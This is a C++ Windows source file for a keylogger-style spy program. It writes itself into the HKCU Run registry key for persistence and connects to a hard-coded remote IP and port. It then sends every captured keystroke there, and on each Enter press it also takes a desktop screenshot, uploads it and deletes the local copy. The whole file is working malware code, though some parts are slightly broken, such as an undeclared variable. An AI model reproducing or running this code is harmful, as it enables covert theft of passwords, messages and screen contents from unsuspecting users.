#include "function.h"
#include <conio.h>
#include <time.h>
#include <tchar.h>
#include <stdlib.h>

#include <stdio.h>
#include <string>
#include <windows.h>
#include <GdiPlus.h>
#include <iostream>
using namespace Gdiplus;
using namespace std;
#pragma comment(lib, "user32.lib") 
#pragma comment(lib,"Wininet.lib")
#pragma comment (lib,"gdiplus.lib")
char send_buffer[2000000];

string file = "server_image.jpg";
void screenshot()
{
	ULONG_PTR gdiplustoken;
	GdiplusStartupInput gdistartupinput;
	GdiplusStartupOutput gdistartupoutput;

	gdistartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(&gdiplustoken, &gdistartupinput, &gdistartupoutput); //start GDI+

	HDC dc = GetDC(GetDesktopWindow());//get desktop content
	HDC dc2 = CreateCompatibleDC(dc);	 //copy context

	RECT rc0kno;  // rectangle  Object

	GetClientRect(GetDesktopWindow(), &rc0kno);// get desktop size;
	int w = rc0kno.right - rc0kno.left;//width
	int h = rc0kno.bottom - rc0kno.top;//height

	HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h);  //create bitmap
	HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);

	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);  //copy pixel from pulpit to bitmap
	Bitmap* bm = new Bitmap(hbitmap, NULL);

	UINT num;
	UINT size;

	ImageCodecInfo* imagecodecinfo;
	GetImageEncodersSize(&num, &size); //get count of codec

	imagecodecinfo = (ImageCodecInfo*)(malloc(size));
	GetImageEncoders(num, size, imagecodecinfo);//get codec

	CLSID clsidEncoder;
	for (int i = 0; i < num; i++)
	{
		if (wcscmp(imagecodecinfo[i].MimeType, L"image/jpeg") == 0)
			clsidEncoder = imagecodecinfo[i].Clsid;   //get jpeg codec id

	}
	free(imagecodecinfo);
	wstring ws;
	ws.assign(file.begin(), file.end());  //sring to wstring
	bm->Save(ws.c_str(), &clsidEncoder);   //save in jpeg format
	SelectObject(dc2, holdbitmap);  //Release Objects
	DeleteObject(dc2);
	DeleteObject(hbitmap);
	ReleaseDC(GetDesktopWindow(), dc);
	GdiplusShutdown(gdiplustoken);
	return;
}
int main()
{
	
	//ShowWindow(GetConsoleWindow(), SW_HIDE);

	TCHAR exepath[MAX_PATH];
	GetModuleFileName(0, exepath, MAX_PATH);
	HKEY hKey;
	LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, KEY_WRITE, &hKey
	);
	if (ERROR_SUCCESS == lnRes)
	{
		lnRes = RegSetValueEx(hKey,
			"test1.exe",
			0,
			REG_SZ,
			(BYTE*)exepath,
			_tcslen(exepath));
	}
	

TEST:
	WSACleanup();

	WSADATA d;
	if (WSAStartup(MAKEWORD(2, 2), &d))
	{
		fprintf(stderr, "Failed to initialize.\n");
		goto TEST;
	}

	//char argv1[] = "52.77.226.117";
	char argv1[] = "192.168.74.130";
	char argv2[] = "10200";

	printf("Configuring remote address...\n");
	struct addrinfo hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_socktype = SOCK_STREAM;
	struct addrinfo* peer_address;
	if (getaddrinfo(argv1, argv2, &hints, &peer_address))
	{
		fprintf(stderr, "getaddrinfo() failed. (%d)\n", GETSOCKETERRNO());
		goto TEST;
	}

	printf("Remote address is: ");
	char address_buffer[100];
	char service_buffer[100];
	getnameinfo(peer_address->ai_addr, peer_address->ai_addrlen,
		address_buffer, sizeof(address_buffer),
		service_buffer, sizeof(service_buffer),
		NI_NUMERICHOST);
	printf("%s %s\n", address_buffer, service_buffer);

	printf("Creating socket...\n");
	SOCKET socket_peer;
	socket_peer = socket(peer_address->ai_family,
		peer_address->ai_socktype, peer_address->ai_protocol);
	if (!ISVALIDSOCKET(socket_peer))
	{
		fprintf(stderr, "socket() failed. (%d)\n", GETSOCKETERRNO());
		goto TEST;
	}

	printf("Connecting...\n");
	if (connect(socket_peer,
		peer_address->ai_addr, peer_address->ai_addrlen))
	{
		fprintf(stderr, "connect() failed. (%d)\n", GETSOCKETERRNO());
		goto TEST;
	}
	freeaddrinfo(peer_address);

	//printf("Connected.\n");
	printf("To send data, enter text followed by enter.\n");


	fd_set reads;
	FD_ZERO(&reads);
	FD_SET(socket_peer, &reads);

	struct timeval timeout;
	timeout.tv_sec = 0;
	timeout.tv_usec = 100000;

	if (select(socket_peer + 1, &reads, 0, 0, &timeout) < 0)
	{
		fprintf(stderr, "select() failed. (%d)\n", GETSOCKETERRNO());
		goto TEST;
	}
	if (FD_ISSET(socket_peer, &reads))
	{
		char read[4096];
		int bytes_received = recv(socket_peer, read, 4096, 0);
		if (bytes_received < 1)
		{
			printf("Connection closed by peer.\n");
			goto TEST;
		}
	}
	while (1)
	{
		char read[50];
		memset(read, '\0', 50);
		for (DWORD i = 0; i < 255; i++)
			if (GetAsyncKeyState(i) == -32767)
			{
				
				memset(key, '\0', 50);
				read[0] = i;
				int bytes_sent = send(socket_peer, translate_key(i), strlen(translate_key(i)), 0);
				if (i == 13)
				{
					screen:
					screenshot();
					FILE* picture;
					picture = fopen("server_image.jpg", "rb");
					int size;
					fseek(picture, 0, SEEK_END);
					size = ftell(picture);
					fseek(picture, 0, SEEK_SET);
					printf("Sending Picture Size\n");
					char file_size[256];


					sprintf(file_size, "%d", size);
					puts("Picture size:");
					puts(file_size);
					send(socket_peer, file_size, sizeof(file_size), 0);

					printf("Sending Picture as Byte Array\n");
					// no link between BUFSIZE and the file size
					printf("%d|n", sizeof(send_buffer));
					printf("Send Start :\n");
					int counter = 0;
					while (!feof(picture))
					{
						int nb = fread(send_buffer, 1, sizeof(send_buffer), picture);
						send(socket_peer, send_buffer, nb, 0);
						printf("%s\n", "Buffer Send ... ");
						printf("%s %d\n", "byte ", nb);
						counter += nb;
						// no need to bzero
					}
					printf("%d\n", counter);
					int status = remove("server_image.jpg");
					if (status == 0)
						printf("oke");
					else
						printf("no");
				}
			}
		   Sleep(10);

	}

	printf("Closing socket...\n");
	CLOSESOCKET(socket_peer);
	WSACleanup();
	printf("Finished.\n");
	goto TEST;
	return 0;
}